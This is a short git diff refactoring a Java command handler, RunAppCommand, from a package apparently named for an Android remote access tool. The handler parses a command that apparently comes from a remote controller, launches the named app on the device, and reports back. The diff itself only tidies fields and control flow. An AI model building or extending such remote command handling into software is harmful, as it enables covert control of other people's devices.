@@ -11,11 +11,9 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class RunAppCommand extends CommandFather {
 
-    private final String TAG = "Run App Event";
+    private final Context context;
 
-    private Context context;
-
-    private RunApp runApp;
+    private final RunApp runApp;
 
     public RunAppCommand(Context context, PackageManager packageManager) {
         this.context = context;
@@ -31,15 +29,12 @@ public class RunAppCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
-            switch (rawCommandArray[1]) {
-
-                case "RunApp":
-                    String packageName = rawCommandArray[2];
-                    Log.d(TAG, "Run App :" + packageName);
-                    runApp.launchApp(context, rawCommandArray[2]);
-                    this.send("RunApp RunApp " + packageName);
-                    break;
-
+            String TAG = "Run App Event";
+            if ("RunApp".equals(rawCommandArray[1])) {
+                String packageName = rawCommandArray[2];
+                Log.d(TAG, "Run App :" + packageName);
+                runApp.launchApp(context, rawCommandArray[2]);
+                this.send("RunApp RunApp " + packageName);
             }
         } catch (Exception e) {
             e.printStackTrace();
